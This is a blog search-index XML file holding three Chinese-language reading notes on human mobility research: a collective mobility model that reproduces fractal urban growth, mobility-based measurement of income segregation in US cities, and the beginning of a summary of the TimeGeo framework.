<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Emergence of urban growth patterns from human mobility behavior</title>
    <link href="/2022/01/01/101/"/>
    <url>/2022/01/01/101/</url>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"><h2 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h2><p>城市自下向上的增长方式导致了用标度律描述的<strong>碎形/分形</strong>(fractal-like)城市结构。相关<strong>渗流模型</strong>(percolation model)</p><p>通过施加强空间相关性成功建模出城市的<strong>几何形状</strong>(urban geometries)。然而，在空间相关的城市增长背后的潜在机制的起源仍然很大程度未知。</p><p>本文介绍了一个计算城市增长模型，在人类移动行为的微观基础上捕捉城市增长的空间相关性。本文将提出的模型与三个实证数据集进行对比，发现人类移动中<strong>强社会联系</strong>和<strong>长时记忆</strong>是碎形城市形态的两个基本原则，以及三个重要的三个城市增长的定律。该模型联系了城市增长模式的实证发现与人类移动行为。</p><a id="more"></a><h2 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h2><p>曾有研究学者提出，由于旨在优化城市发展中城市功能和空间利用的可达性的自上向下严格的城市规划规定，城市应该具有对称和规则的形态。</p><p>然而，越来越多的城市数据表明，城市是以自下而上的方式发展的，需要理解其微观基础。</p><p>发现三条基本的实证定律:</p><ul><li>城市大小的分布符合指数在-2.0左右的标度律</li><li>城市人口随区域面积超线性增长</li><li>城市占据区域随距城市中心径向距离指数递减</li></ul><p>相关渗流模型的重要发现是在城市增长中需要<strong>强烈的空间相关性</strong>来再现标度关系。</p><p>所以研究人员提出把城市增长分为两个方面进行建模:新簇的出现和存在簇的增长。</p><p>先前的模型虽然成功解释了城市形态，但都把城市增长建模为物理粒子的随机过程，遗留了人类移动在微观基础上很大程度未知的问题。</p><h2 id="Results"><a href="#Results" class="headerlink" title="Results"></a>Results</h2><h3 id="Human-movement-models"><a href="#Human-movement-models" class="headerlink" title="Human movement models"></a>Human movement models</h3><p>现存的人类移动模型基于社会联系和长时记忆可以被分为四类。</p><p><img src="/2022/01/01/101/image-20220111121548488.png" alt="image-20220111121548488"></p><p>社会联系指个体的移动会影响其他人。</p><p>长时记忆指个体未来的移动行为受他历史移动的影响。</p><p>(1)Catergory-1</p><p>Category-1将人类移动看作没有社会联系的粒子随机移动。</p><p>布朗运动中个体的位移正态分布，与物理粒子不同，实证数据中人类移动符合胖尾分布(幂律)。</p><p><img src="/2022/01/01/101/image-20220111141556842.png" alt="image-20220111141556842"></p><p>转移概率随距离(即移动花费的距离)减少,即大部分时间人们短距离移动，偶尔长距离移动。</p><p>忽略社会关系和长时记忆，该式表明人类移动遵循莱维飞行模型，但莱维飞行和布朗运动在时间t接近无穷时都预测均匀的人口分布，与实证观测相反。</p><p>(2)Catergory-2</p><p>Category-2中辐射模型和引力模型都起源于对迁移的研究，两地之间的移动流取决于他们的人口。</p><p>引力模型的转移概率如下</p><p><img src="/2022/01/01/101/image-20220111141611399.png" alt="image-20220111141611399"></p><p>其中$\rho_0$是一个耦合常数。除了(1)式中的胖尾分布，引力模型的转移概率还与位置$\overrightarrow{v}$的人口呈线性关系增长。该机制解释了在平均场背景下在社会联系中存在的吸引力，例如人口密集的地方通常提供更多的社会机会。</p><p>但是引力模型遵循与莱维飞行相同的扩散过程，在t很大值下预测均匀的城市人口分布。</p><p>(3)Catergory-3</p><p>Category-1/2中的个体随意地进行移动，但实证数据中发现显著的周期性访问模式。为了解释这些观测，个体移动模型(IMM)将人类移动行为看作两个阶段:return/exporation来解释长时记忆效应。</p><p>提出偏好返回机制，即返回先前访问过得位置$\overrightarrow{v_i}$的概率是</p><p><img src="/2022/01/01/101/image-20220111142813407.png" alt="image-20220111142813407"></p><p>与历史访问频率成正比，这样的长时记忆返回过程大大减缓了人类的扩散过程。</p><p>IMM预测典型移动距离$l_t$符合对数增长:</p><p><img src="/2022/01/01/101/image-20220111142941559.png" alt="image-20220111142941559"></p><p>其中A是访问位置的总体数目。对数增长是人类移动的关键特征，描述了异常的极慢扩散和活动范围的影响。</p><p>d-EPR模型对IMM模型进行了推广，个体探索新位置的概率与其人口密度呈正比。</p><p>即使d-EPR和IMM模型都成功捕捉了日常个体的移动，但个体独立的移动并且不与其他个体相互作用，是静态的且不随时间演变。这个模型不能捕捉个体之间的动态交互，也不能再现城市增长模式。</p><p>(4)Category-4</p><p>既包含社会关系也包含长时记忆的模型很大程度上是没被探索的。最近提出的GeoSim模型将社会网络(每个个体更倾向于探索他们朋友访问的位置)与有记忆的IMM模型结合，然而社会网络需要根据实证数据提前确定，不随时间演化，也无法长时间追踪城市增长。</p><h3 id="The-collective-mobility-model"><a href="#The-collective-mobility-model" class="headerlink" title="The collective mobility model"></a>The collective mobility model</h3><p>为了结合长时记忆与动态交互关系，本文提出群体移动模型(CMM)，提供了将人类移动与城市增长联系的最小原则。</p><p><img src="/2022/01/01/101/image-20220111145028628.png" alt="image-20220111145028628"></p><p>该图为CMM模型的图示。在时间$t_1$，个体位于位置$v_0$且他已经访问四个位置(S=4)。结点大小代表位置的人口大小，结点颜色的程度代表该地点的访问频次。</p><p>在该模型中，个体的移动依照IMM模型中return-exploration过程，个体决定返回到先前访问过的地点的概率为$P_{ret}=1-\delta S^{-\gamma}$,其中S是先前访问地点数目，$\delta$控制初始返回概率，$\gamma$控制返回概率怎样随S变化。返回选择位置的概率正比于他先前访问位置的频次。</p><p>个体同样具有互补的探索概率$P_{exp}=\delta S^{-\gamma}$。在探索的过程中，个体将选择<strong>在人口和距离基础上先前没访问过的地点，满足(3)式中的引力定律。其中人口$\rho(\overrightarrow{v})$在t时刻所有个体的位置的基础上瞬时计算。</strong>$\rho_0^{-1}$可以看做是平滑常数，控制人口的吸引强度，增加该值降低了探索无人居住位置的概率，加强了社会联系。</p><p>受具有强空间相关性的相关渗流模型的影响，本文对具有强耦合$\rho_0^{-1}\rightarrow\infty$感兴趣。IMM被视作CMM的特殊情况，$\rho_0^{-1}\rightarrow0$。</p><p>CMM模型可以在任意时间尺度下以自组织的方式模拟城市增长并且不依赖任何外部参数。</p><h3 id="Experimental-settings"><a href="#Experimental-settings" class="headerlink" title="Experimental settings"></a>Experimental settings</h3><p>本文使用三个包含人口的城市区域的公开数据集（US/GB(英国)/柏林）</p><p>为了对比，本文使用category1-4的模型(莱维飞行，引力模型，IMM,CMM)进行人类移动的模拟。</p><p>该模拟在一个l×l的二维仿真空间中进行的，模拟的居民初始位于城市中心，即仿真空间的中心点。随后在每个时间步迭代他们的下一个位置直到模拟收敛。</p><h3 id="Urban-morphology"><a href="#Urban-morphology" class="headerlink" title="Urban morphology"></a>Urban morphology</h3><p><img src="/2022/01/01/101/image-20220111155450225.png" alt="image-20220111155450225"></p><p>该图画出人口分布图来比较模拟城市系统和实证观测的城市形态。图a-d分别由莱维飞行、引力模型、IMM、CMM生成，图e为伦敦城市的实证数据。</p><p><strong>实证数据中表现出显著的特征:紧凑的城市中心和碎形的周边。</strong></p><p>莱维飞行和引力模型模拟的城市人口分布遵循分数阶扩散过程(the fractional diffusion process),都意味着随着时间推移，个体会逐渐远离他们的初始位置。模拟结果证实这两种模型不能再现紧凑而稳定的城市中心，收敛时人口在城市空间中均匀分布。</p><p>IMM预测城市系统在边缘同质增长，模拟结果显示城市区域的周边是标准的圆形，距离城市中心相同的径向距离有相同的人口密度。IMM模型不能再现城市区域的碎形形态。</p><p>CMM成功再现了城市系统中紧凑的城市中心，人口密度大幅度高于城市周边。此外，城市周边具有明显的碎形几何特征，并在其周围形成了大量的子群，这些观测与实证数据一致。</p><h3 id="Urban-growth-patterns"><a href="#Urban-growth-patterns" class="headerlink" title="Urban growth patterns"></a>Urban growth patterns</h3><p>本文通过三个基本的实证定律检验模型再现城市增长模式的能力:</p><p>(1)城市规模分布: 城市数目N(A)随他们的面积减小符合标度律</p><p><img src="/2022/01/01/101/image-20220111162103301.png" alt="image-20220111162103301"></p><p><img src="/2022/01/01/101/image-20220111162859402.png" alt="image-20220111162859402"></p><p>指数在2.0左右。</p><p>该图为实证数据中城市大小的分布。在三个数据集中的估计指数分别为1.94,2.01,2.08，这些发现与<strong>位置渗透理论(site percolation theory)的理论预测</strong>相一致。。</p><p>渗透理论是描述这一观测结果的普遍框架，其产生某个位置被占用为城市区域的概率。它预测了(6)式的标度律指数在2.0-2.5左右，其中指数为2对应不同位置之间的强相关，指数为2.5对应平均场理论。</p><p>莱维飞行将移动描述为个体的扩散过程，城市系统达到稳态时，城市人口在空间中均匀分布。与莱维飞行相同，当t趋近于正无穷时，人口也会均匀分布。<strong>因此，莱维飞行和引力模型预计将在不相关渗流(uncorrelated percolation)中生成指数为2.5左右的标度律</strong>。</p><p><img src="/2022/01/01/101/image-20220111165245336.png" alt="image-20220111165245336"></p><p><img src="/2022/01/01/101/image-20220111165323078.png" alt="image-20220111165323078"></p><p>该图展示了莱维飞行和引力模型再现幂律城市大小分布，指数为2.55和2.58，与渗透理论一致。</p><p>模拟的IMM符合指数为2.98的标度律。这个较大指数意味着人们只局限于他们的活动范围。</p><p>相反，CMM展现出强相关性，其再现了指数为2.02的标度律，与理论预测和实际数据一致。本文发现CMM是唯一一个在95%置信区间内包含实证观察到的普遍指数为2.0的模型。</p><p>(2)人口和城市规模的超线性相关:</p><p>大城市往往有较高的城市人口密度，定义为$\rho_A \equiv N(A)/A$。</p><p>(N(A)代表区域A中城市的数量)</p><p>研究人员认为因为在大城市的空间竞争更激烈，故有更多的高层建筑来应对更密集的人口。</p><p>最近的研究表明，城市区域集中人口收支之间的平衡可以解释观测到的超线性增长。这个社会经济假说包含两条假设:</p><ul><li><p>从强烈的社会互动中获得的平均收入与人口密度$\rho_A$成正比</p><p>(与(3)式中社会互动一致)</p></li><li><p>平均生活支出与探索城市的典型移动距离$l_t$成正比</p><p>(与(4)式中长时记忆效应一致)</p></li></ul><p>收支平衡时有$\rho_A \approx l_t $</p><p>代入等式(5)(典型移动距离$l_t$随访问位置数A对数增长)得到</p><p><img src="/2022/01/01/101/image-20220112162319444.png" alt="image-20220112162319444"></p><p><img src="/2022/01/01/101/image-20220112162958493.png" alt="image-20220112162958493"></p><p>该图绘制了在US和GB不同城市中$\rho_A$随A的变化，发现实证观测与式(7)预测的对数律一致。</p><p>值得注意的是，之前的研究显示，大多数城市遵循小指数$\delta \approx 0.04 \sim 0.3$的标度律$\rho_A \approx A^{\delta}$，但在实证数据的幅度范围内，无法区分对数关系和小指数标度律。</p><p>式(7)中指出的对数关系为人口增长模式的起源提供了另一种解释，它源于人类移动行为。</p><p><img src="/2022/01/01/101/image-20220112204510221.png" alt="image-20220112204510221"></p><p>该图为四个模型模拟的城市人口密度与城市规模之间的关系。</p><p>本文提出的CMM模型再现了对数律，其他三个模型用系数为0的直线进行拟合，说明它们预测人口密度独立于城市规模。</p><p>(3)指数的城市占有概况(occupation profile)</p><p>城市占有概况 $\phi(r) $定义为在距城市中心距离为r找到人口密集区域的概率。在先前研究中观察到的指数概况:</p><p><img src="/2022/01/01/101/image-20220112210406139.png" alt="image-20220112210406139"></p><p><img src="/2022/01/01/101/image-20220112210457499.png" alt="image-20220112210457499"></p><p>该图为在三个实证数据集中对该模式的检验，其中$\lambda$分别为0.3,0.3,0.4。该图说明城市中心吸引了大多数人口，占有概率随r快速递减。</p><p><img src="/2022/01/01/101/image-20220112211313906.png" alt="image-20220112211313906"></p><p>该图为四种模型模拟的城市占有概况。莱维飞行与引力模型不能再现城市中心，预测的$\phi(r)$不随距离r变化。缺乏社会互动的IMM模型不能再现城市边缘地区的大子群，导致城市边缘区域人口密度急剧下降。而CMM模型符合式(8)提出的指数律。</p><p>此外，下降率$\lambda$ 应随城市边界不断扩大的时间演化而降低。</p><p><img src="/2022/01/01/101/image-20220113013915070.png" alt="image-20220113013915070"></p><p>该图展示了实证数据柏林的城市占有概况的时间演化。从图中可以看出，随年份增加，降低速率逐渐变缓。</p><p><img src="/2022/01/01/101/image-20220113014624493.png" alt="image-20220113014624493"></p><p>CMM模型的模拟结果再现了城市发展中占用概况的时间演化。</p><h3 id="Impact-of-simulation-parameters"><a href="#Impact-of-simulation-parameters" class="headerlink" title="Impact of simulation parameters"></a>Impact of simulation parameters</h3><p>有三个重要的参数可能影响城市系统的模拟</p><p><img src="/2022/01/01/101/image-20220112235939752.png" alt="image-20220112235939752"></p><ul><li><p>(3)式中的$\alpha$ </p><p>描述主要移动距离成本，控制每个位移的距离分布</p></li><li><p>(3)式中的$\rho_0$</p><p>主要控制社会互动的重要性，它决定个体探索更多人口密集地区的概率，$\rho_0^{-1}\rightarrow \infin$ 时再现强互动性的城市系统。</p></li><li><p>$\omega$ 平均人口密度</p><p>定义为居民人数与位置数的比率，即$\omega=M/l^2$</p><p>它代表个体在每个单位空间中社会互动的数量。</p></li></ul><p><img src="/2022/01/01/101/image-20220113001147276.png" alt="image-20220113001147276"></p><p>该图为CMM模型不同参数数值再现城市形态的比较。</p><p>标准参数设置为$\omega=1/3,\alpha=0.55,\rho_0=0$</p><p>在图a-f中对模拟中单个参数值进行修改，其中</p><p>(a)$\omega=1/6$   (b)$\omega=1/2$  </p><p>(c)$\alpha=-0.45$   (d)$\alpha=1.55$</p><p>(e)$\rho_0=10^{-6}$  (f)$\rho_0=1$ </p><p>(1)$\omega$ </p><p>图ab表明$\omega$没有显著影响城市系统的碎形形态。</p><p><img src="/2022/01/01/101/image-20220113015227045.png" alt="image-20220113015227045"></p><p>该图为设置不同$\omega$值对再现城市增长模式的影响。</p><p>城市规模分布，人口增长模式和城市占有概况在不同$\omega$设置下都与实证观测一致。</p><p>这个结果表明城市的增长模式在不同$\omega$下是稳定的。</p><p>(2)$\alpha$</p><p>$\alpha$对模拟城市的紧凑性有重要的影响，这可能是因为它控制式(1)中每次探索的jump-size步长大小的分布。</p><p>当$\alpha$比实证数据小，探索将有较大的步长。图c中表示城市系统的占据区域将更分散，分布更远离城市中心。</p><p>当$\alpha$比实证数据大，如图d所示，模拟的城市系统更聚合，产生更大的子群。</p><p><img src="/2022/01/01/101/image-20220113020819708.png" alt="image-20220113020819708"></p><p>该图为设置不同$\alpha$值对再现城市增长模式的影响。</p><p>当$\alpha$值不同时，城市规模分布 、人口增长模式、城市占有概况都背离实证规则。这些结果表明，$\alpha$ 在城市形态和城市增长模式中均有重要作用。因此，$\alpha$ 不仅是人类移动行为的重要参数，也是影响城市增长的重要因素。</p><p>(3)$\rho_0$</p><p>该参数很大程度上影响了城市区域的形态。</p><p>图e展示出显著的碎形形态($\rho_0=10^{-6}$)</p><p>当将$\rho_0$增加到1，如图f所示，不能再现碎形的城市形态，并且 其在城市边缘展现出同质增长。</p><p><img src="/2022/01/01/101/image-20220113022002649.png" alt="image-20220113022002649"></p><p>g图表示城市规模分布的指数随$\rho_0$增加而逐渐增加。(?)</p><p>h,i表示当$\rho_0$从0增加到1时，人口增长模式和城市占用概况也偏离了实证规则。</p><p>这些结果说明参数$\alpha$和$\rho_0$在CMM模型中对城市系统的紧密性和碎形形态有重要影响。</p><h2 id="Disscusion"><a href="#Disscusion" class="headerlink" title="Disscusion"></a>Disscusion</h2><p>本文试图建立城市增长与人类移动之间的关系。</p><p>值得注意的是，尽管大多数人类移动模型都基于以日常移动为主的活动性移动行为，但城市增长与居住移动(即居住迁移)的关系更为密切。尽管这两种移动是<strong>在不同时间尺度下</strong>的人类移动，但是它们在表现模式上有相同特征。CMM模型通过不同的参数设置为活动性移动和居住性移动提供框架(例:居住性移动有更小的转移率)。</p><h2 id="Supplementary"><a href="#Supplementary" class="headerlink" title="Supplementary"></a>Supplementary</h2><p>留坑了……</p><h3 id="标度律"><a href="#标度律" class="headerlink" title="标度律"></a>标度律</h3><p>研究模型内的各个物理量是如何随着规模的变化而变化的</p><h3 id="平均场"><a href="#平均场" class="headerlink" title="平均场"></a>平均场</h3><p>mean-field</p><h3 id="渗透理论"><a href="#渗透理论" class="headerlink" title="渗透理论"></a>渗透理论</h3><p>percolation theory</p><p>强相关性与不相关(uncorrelated percolation)  平均场</p><h2 id="总结及理解"><a href="#总结及理解" class="headerlink" title="总结及理解"></a>总结及理解</h2><h3 id="理解"><a href="#理解" class="headerlink" title="理解"></a>理解</h3><p>1.d-EPR模型虽然包含个体探索正比人口密度的机制，但仅限于个体层面，是静态的且不随时间演化，故与社会关系无关。</p><p>涉及引力模型中提到的平均场与背景场概念。</p><p>2.$\rho_0^{-1}\rightarrow\infty$说明模型的人口吸引强度极强，有强烈的社会关系。而$\rho_0^{-1}\rightarrow0$说明模型的人口吸引强度极弱，人口密度与探索概率基本无关，不具有社会关系。</p><p>3.IMM模型在标度定律(1)中指数较大说明假设在同等面积下，所具有的城市数量越少，这与其模型机制只包括个体，不具有社会关系有关，故个体更局限于自己的活动范围。</p><p>4.城市占有概况的指数律说明大部分人集中在城市中心，周边聚集情况大幅度递减，而式(1)中提出人类移动符合胖尾分布，即人类有可能到达远离初始位置的区域，这两点是相矛盾的。故在模拟实验中莱维飞行和引力模型不能再现该指数律。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>本文从社会和记忆两个角度对之前提出的人类移动模型进行分类，并提出同时具有社会互动和长时记忆机制的群体移动模型(CMM)。随后从城市形态(人口分布)和增长规律模式两个方面，对原有模型/提出模型/实证数据进行对比，并设置不同参数来观察对CMM模型的影响。</p><p>组会结束之后对该文有了更深层次的理解。该模型是对基于个体移动模型的改进(原EPR模型)，主要的改进是探索机制中使用引力模型相关距离和人口的转移概率，特点是进行实时的动态人口计算。</p><p>其中组会提出的问题：城市周边分形出现的原因?</p><p>与动态的人口计算有关。假设在模拟过程中，下一个位置探索选择的概率与此时各位置所在人口有关。如果该位置此时没有人口，则不会有个体选择该位置。所以可以说选择的概率二分了，要不有要不没有，所以城市周边会产生碎形(即小子群)。若是静态输入人口密度，采取累加的方法，则每个位置至少有一定探索概率，不会出现完全没有的情况。</p><p>该模型同时存在缺点:只考虑时步，没考虑stay</p>]]></content>
    
    
    <categories>
      
      <category>Paper reading</category>
      
    </categories>
    
    
    <tags>
      
      <tag>mobility model</tag>
      
      <tag>human mobility</tag>
      
      <tag>urban</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Mobility patterns are associated with experienced income segregation in large US cities</title>
    <link href="/2021/12/16/1216/"/>
    <url>/2021/12/16/1216/</url>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"><h2 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h2><p>收入隔离不只是基于粗粒度的静态居住模式，移动行为也对经历性的收入隔离(experienced income segregation)的产生起着重要作用。</p><p>本文指出经历性的收入隔离即使在接近的空间范围内也存在很大不同。本文通过对EPR模型进行谢林扩展，发现经历性的收入隔离与个体探索新地点的趋势(空间探索)和有来自不同收入群体的游客的地方有关(社会探索)。</p><p>本文认为移动行为在个体的经历收入隔离中起着很大作用。在收入隔离中不仅是居住模式，也应该考虑移动行为。</p><a id="more"></a><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>为了量化收入隔离，研究人员经常测量在城市中不同收入群体之间的实际的社会互动或接触。由于在真实世界中难以测量，许多研究通过量化人们与其他不同经济背景的人群互动的潜在机会(一个人在日常生活中接触到不同收入群体的数量)进行代替。</p><p>收入隔离被理解为与其他群体接触受到限制的结果。</p><h2 id="results"><a href="#results" class="headerlink" title="results"></a>results</h2><p>本文通过其所在地区的家庭收入中位数，将个体分为四个等大的群体，并提取个体的停留(超过五分钟)。</p><p>计算每个地点不同经济群体花费时间占比来测量地点的收入隔离</p><p><img src="/2021/12/16/1216/image-20211222155844915.png" alt="image-20211222155844915"></p><p>使用度量$S_{\alpha}$量化收入隔离([0,1])</p><p>当所有人在该地点花费时间被四个群体平均分配时，该地点是完全综合的。$S_\alpha=0$</p><p>当地点只有一个收入群体访问时，隔离水平更高，$S_{\alpha}$=1</p><p>在个人经历的水平下定义收入隔离，我们计算个体在每个地方花费的时间，使用地点收入隔离度量，计算个体和每个经济群体之间的相对接触。</p><p><img src="/2021/12/16/1216/image-20211222160553759.png" alt="image-20211222160553759"></p><h3 id="Income-segregation-of-places"><a href="#Income-segregation-of-places" class="headerlink" title="Income segregation of places"></a>Income segregation of places</h3><p>作者发在细粒度的空间分辨率中发现，经济上混合的地方与那些高度隔离的地方只有几十米的距离，甚至就在街对面。</p><p><img src="/2021/12/16/1216/image-20211222161117646.png" alt="image-20211222161117646"></p><p>该图为波士顿市区的收入隔离情况。</p><p><img src="/2021/12/16/1216/image-20211222160845475.png" alt="image-20211222160845475"></p><p>该图棕色部分为实际数据中地点的收入隔离，异质性较强。</p><p><img src="/2021/12/16/1216/image-20211222164017345.png" alt="image-20211222164017345"></p><p>该图为标准化后数据集中每个城市的地点收入隔离分布情况。收入隔离在美国众多大都市中表现出惊人地相似。</p><p><img src="/2021/12/16/1216/image-20211222164228379.png" alt="image-20211222164228379"></p><p>该图为地点和个体收入个体的空间相关性分析以及人口普查街区收入的空间相关性。</p><p>人口普查街区分组中即使在1km处收入隔离和空间也有较大的相关性，而地点和个体收入隔离在短距离内只有很小的空间相关性。</p><p>这些结果都说明地点所在社区或人口普查区域不能预测收入隔离:城市中的大多数地区都是高度融合和高度隔离的地方。</p><p>本文通过使用简单的回归模型，对数据集中每个地点的收入隔离进行建模，分析地点和收入隔离的关系。</p><p>结果发现影响地点收入隔离两个最重要的变量是地点的种类和个体到该地点的平均移动距离(汇集范围catchment range)。</p><p><img src="/2021/12/16/1216/image-20211222165108346.png" alt="image-20211222165108346"></p><p>该图为对该回归模型的变量重要性分析。</p><p>图中发现地方收入对收入隔离只有轻微影响。</p><p><img src="/2021/12/16/1216/image-20211222165224959.png" alt="image-20211222165224959"></p><p>该图表示地点类别和汇集范围与收入隔离的关系。</p><p>城市中的独有地点，如艺术场馆、博物馆和机场，是高度综合的，杂货店等场所更隔离。</p><p>将后者解释为居住收入隔离的产物:人们更有可能去离家近的杂货店。</p><p>但收入隔离的产生不仅仅取决于这两个因素，例如工作场所和餐馆在收入隔离和汇集范围上都是分散。</p><p>这一结果表明，即使是具有相同移动模式的人，仅仅通过访问不同类型的地方，可能也会经历不同水平的收入隔离。</p><h3 id="Income-segregation-experienced-by-individuals"><a href="#Income-segregation-experienced-by-individuals" class="headerlink" title="Income segregation experienced by individuals"></a>Income segregation experienced by individuals</h3><p>数据表明，只有少数人之间的相遇发生在同一人口普查地区，大多数人在某一地点相遇远超人们所居住地区的范围。</p><p><img src="/2021/12/16/1216/image-20211222171021590.png" alt="image-20211222171021590"></p><p>该图为个体的收入隔离。从图中看出，个体之间的经历收入隔离也是相当不同的。</p><p>即使是住得很近的人也会有非常不同的收入隔离经历，即表示空间相关性的上图。超过50m,个体经历的收入隔离的空间相关性显著下降。这表明，个人经历的收入隔离主要不是由人们居住的地方来产生的。</p><p>个体经历的收入隔离是由一个个体在日常移动行为中接触其他经济群体的可能性衡量的，基于他去过地方的收入隔离模式和花费时间。</p><p>由于个体访问不同地点的时间是重尾分布的，则个体的经历收入隔离应该由他访问次数较多的重要地点产生。</p><p>explorer(个体访问和花费时间在许多不同地点)的重要地点集合大于returner(把时间花在几个少数重要地点)。</p><p>本文发现这种探索行为与经历收入隔离的产生有关。</p><p>设$S_T$为访问位置数目的总数，returner(with a small $S_T$)比explorer(with a large $S_T$)更具有收入隔离。 访问位置总数与经历收入隔离有较高相关性。这说明经历收入隔离与移动访问模式有关。</p><p>本文也发现，收入隔离的个体访问同样收入隔离的地点。个体经历的收入隔离与访问地点的平均收入隔离程度存在较高的相关性，说明个体会去收入隔离程度与自己整体经历相似的地点。</p><h3 id="Social-EPR-model"><a href="#Social-EPR-model" class="headerlink" title="Social EPR model"></a>Social EPR model</h3><p>使用EPR模型，个体的移动可以被一个单独的个体参数$\rho$描述，可以通过<strong>个体的地方探索性</strong>来充分解释。</p><p>该地点探索性定义为$\sigma_p=S_T/N$</p><p>$S_T∝\rho$  为个体访问的不同地点数，N是个体发出点的所有访问次数。</p><p><img src="/2021/12/16/1216/image-20211222181257695.png" alt="image-20211222181257695"></p><p>该图为观测到的个体地点探索性和社会探索性的分布情况。用户倾向于频繁访问新地点($\bar \sigma_p$=0.43)，也存在大量的explorer($\sigma_p&gt;\bar \sigma_p$)和returner($\sigma_p&lt;\bar \sigma_p$)</p><p>由于原始EPR模型假设个体随机选择访问地点或只在当前区域中，与地点的隔离程度无关，意味着来自某一特定地区的所有个体都会有非常相似的收入隔离经历。故原始EPR模型不能解释个体收入隔离的可变性。</p><p>本文扩展了原始EPR模型来解释个体访问地点的收入隔离模式。引入一个参数，让人想到谢林提出的隔离模型(Schelling segregation)，量化一个地点的大多数访问者是否来自同一收入群体。</p><p>通过谢林参数或社会探索率$\sigma_s$来描述每个个体，定义为个体去一个他所属的经济群体占少数的新地点的概率。该参数描述了个体去过地点的收入隔离模式，$\sigma_s$小的个体大多数时间待在他所属经济群体为多数的地点。</p><p><img src="/2021/12/16/1216/image-20211225222516671.png" alt="image-20211225222516671"></p><p>但个体的经历性收入隔离不仅是由$\sigma_s$解释的，预测个人经历的收入隔离的总体水平是由$\sigma_p$和$\sigma_s$相互作用的，$\sigma_S$控制人们访问地点的隔离模式，$\sigma_p$控制人们                                                                                                                                                                                                     他们多久访问。</p><p>经济融合的唯一途径是同时成为一个social and place explorer($\sigma_p$  $\sigma_s$都大)。</p><h3 id="Explaining-exploration-and-experienced-income-segregation"><a href="#Explaining-exploration-and-experienced-income-segregation" class="headerlink" title="Explaining exploration and experienced income segregation"></a>Explaining exploration and experienced income segregation</h3><p>为了理解是什么预测了个体的社会和空间探索模式，本文研究了可能影响个人在城市中相遇类型的三个方面：</p><ul><li>生活方式/移动行为变量  个体访问的地点</li><li>地理移动 日常出行的城市范围</li><li>居住  个体居住社区的人口统计特征</li></ul><p><img src="/2021/12/16/1216/image-20211225223734599.png" alt="image-20211225223734599"></p><p>通过使用简单的线性回归模型来研究这些维度的相关权重，对社会探索性$\sigma_s$、空间探索性$\sigma_p$和个体经历的收入隔离度量S进行建模。</p><h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><h3 id="Schelling-segregation"><a href="#Schelling-segregation" class="headerlink" title="Schelling segregation"></a>Schelling segregation</h3><p><a href="https://zhuanlan.zhihu.com/p/377518772" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/377518772</a></p>]]></content>
    
    
    <categories>
      
      <category>Paper reading</category>
      
    </categories>
    
    
    <tags>
      
      <tag>mobility model</tag>
      
      <tag>income segregation</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>The TimeGeo modeling framework for urban motility without travel surveys</title>
    <link href="/2021/11/02/1102/"/>
    <url>/2021/11/02/1102/</url>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"><p>不需要出行调查的城市流动性建模框架TimeGeo</p><h2 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h2><p>许多精细尺度的城市流动模型都需要繁琐昂贵的出行调查来校准，且这种出行调查成本高采样率低。</p><p>本模型旨在对通讯技术提供的大量低成本地理标记数据(无法告诉我们用户的详细活动选择)进行根本性的范式转换，以模拟城市流动。</p><p>本文提出的TimeGeo模型可以<strong>在10min时间间隔和百米的分辨率下高效产生城市流动模式，从通信活动中可用的稀疏和不完整的数据中生成完整的城市流动概况。</strong></p><a id="more"></a><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="Data"><a href="#Data" class="headerlink" title="Data"></a>Data</h3><p>手机通信数据具有采样偏差，不能为每个人提供完整的空间和时间旅程。需要一种的范式转换适应这种稀疏数据来模拟城市中个人的日常轨迹。</p><p>从移动通话数据中提取活动</p><ul><li>CDR data   </li><li>1.92 million   </li><li><p>6 wk  in  2010 </p></li><li><p>Greater Boston area</p></li></ul><p>做对照实验，使用一个研究生捐献的自收集长达14mon的移动手机轨迹。( same region,in 2013 and 2014)</p><p>定义停留(stay):个体在某一地点进行某一活动(stay提取方法参考文献23)</p><p>对于每个用户，根据开始时间和访问每个stay地点的频率，推断stay地点类型为家(H)、工作(W)或其他(O)。</p><p>在数据集中过滤活跃用户:提取数据集中原始用户75%的家坐标，并过滤总stay超过50次并至少在家stay10次的用户。这些活跃用户用来提取TimeGeo模型的参数。</p><p>作者将这些用户分为通勤者(有往返工作地的出行)和非通勤者(没有往返工作地的出行)两类。</p><p><img src="/2021/11/02/1102/image-20211105175523819.png" alt="image-20211105175523819"></p><p>该图展示了三天中学生自我收集的移动轨迹中stay的地点和在连续的stay之间发生的移动(即定义为每天的行程)。不同活动类型地点及其之间的连线用颜色区分。</p><p>下图是所有stay地点的访问频率，两图之间的时间条显示了每次stay的开始时间和持续时间。</p><h3 id="Generating-Mechanism"><a href="#Generating-Mechanism" class="headerlink" title="Generating Mechanism"></a>Generating Mechanism</h3><p>该模型整合了人类移动的时间空间选择机制。</p><p>本文假设个体:</p><ul><li><p>工作活动有固定的位置，开始时间和持续时间</p></li><li><p>家活动有固定的位置，但开始时间和持续时间是灵活的</p></li><li>其他活动的位置，开始时间 ，持续时间都是灵活的</li></ul><p>本文提出的框架旨在模拟灵活的空间和时间流动性选择，固定的活动(即工作)的时间被假定为预先确定的。</p><p><img src="/2021/11/02/1102/image-20211111214439699.png" alt="image-20211111214439699"></p><p>TimeGeo模型的流程图</p><h4 id="Temporal-Choices"><a href="#Temporal-Choices" class="headerlink" title="Temporal Choices"></a>Temporal Choices</h4><p>文章使用带有三个参数的time-inhomogeneous(?非齐次)马尔科夫链模型来捕捉个体出行的倾向和在连续序列中进行短时间活动的可能性。</p><p>参数:the weekly home-based tour<br>number($n_w$), the dwell rate($\beta_1$), and the burst rate($\beta_2$). 